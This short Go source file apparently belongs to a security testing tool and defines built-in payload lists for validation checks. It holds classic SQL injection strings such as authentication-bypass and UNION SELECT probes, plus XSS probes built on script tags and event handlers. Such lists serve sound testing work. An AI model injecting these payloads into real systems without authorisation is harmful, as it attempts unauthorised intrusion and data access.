package payloads

// Built-in payloads for common security validations.
var SQLi = []string{
	"' OR 1=1--",
	"\" OR 1=1--",
	"admin' --",
	"' UNION SELECT 1, 2, 3--",
}

var XSS = []string{
	"<script>alert(1)</script>",
	"\" autofocus onfocus=\"alert(1)\"",
	"<img src=x onerror=alert(1)>",
}

// Get returns a list of predefined payloads for a given type.
func Get(payloadType string) []string {
	switch payloadType {
	case "sqli":
		return SQLi
	case "xss":
		return XSS
	default:
		return nil
	}
}
